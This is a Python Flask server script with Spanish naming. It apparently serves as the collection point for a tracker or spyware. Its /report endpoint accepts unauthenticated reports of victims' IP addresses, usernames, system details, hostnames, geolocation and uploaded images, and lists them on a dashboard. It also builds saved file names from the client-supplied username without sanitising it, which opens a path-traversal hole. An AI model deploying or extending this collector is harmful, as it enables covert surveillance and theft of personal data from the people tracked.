from flask import Flask, request, render_template, send_from_directory
from datetime import datetime
import os
import json

app = Flask(__name__)

UPLOAD_FOLDER = 'static/uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

REPORTES_JSON = 'reportes.json'

if not os.path.exists(REPORTES_JSON):
    with open(REPORTES_JSON, 'w') as f:
        json.dump([], f)

@app.route("/")
def index():
    with open(REPORTES_JSON, 'r') as f:
        reportes = json.load(f)
    return render_template("index.html", reportes=reportes[::-1])

@app.route("/report", methods=["POST"])
def report():
    try:
        ip = request.form.get("ip", "No recibido")
        username = request.form.get("username", "No recibido")
        system_info = request.form.get("system_info", "No recibido")
        hostname = request.form.get("hostname", "N/A")
        hora = request.form.get("hora", str(datetime.now()))
        ciudad = request.form.get("ciudad", "N/A")
        region = request.form.get("region", "N/A")
        pais = request.form.get("pais", "N/A")
        loc = request.form.get("loc", "N/A")

        image_file = request.files.get("image")
        image_filename = None
        if image_file:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            image_filename = f"{username}_{timestamp}.jpg"
            image_path = os.path.join(UPLOAD_FOLDER, image_filename)
            image_file.save(image_path)

        nuevo_reporte = {
            "ip": ip,
            "username": username,
            "system_info": system_info,
            "hostname": hostname,
            "hora": hora,
            "ciudad": ciudad,
            "region": region,
            "pais": pais,
            "loc": loc,
            "imagen": image_filename
        }

        with open(REPORTES_JSON, 'r') as f:
            reportes = json.load(f)
        reportes.append(nuevo_reporte)
        with open(REPORTES_JSON, 'w') as f:
            json.dump(reportes, f, indent=2)

        return "Reporte recibido correctamente", 200
    except Exception as e:
        return f"Error al procesar reporte: {e}", 500

@app.route("/uploads/<filename>")
def uploaded_file(filename):
    return send_from_directory(UPLOAD_FOLDER, filename)

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))  # Para Render
    app.run(host="0.0.0.0", port=port)
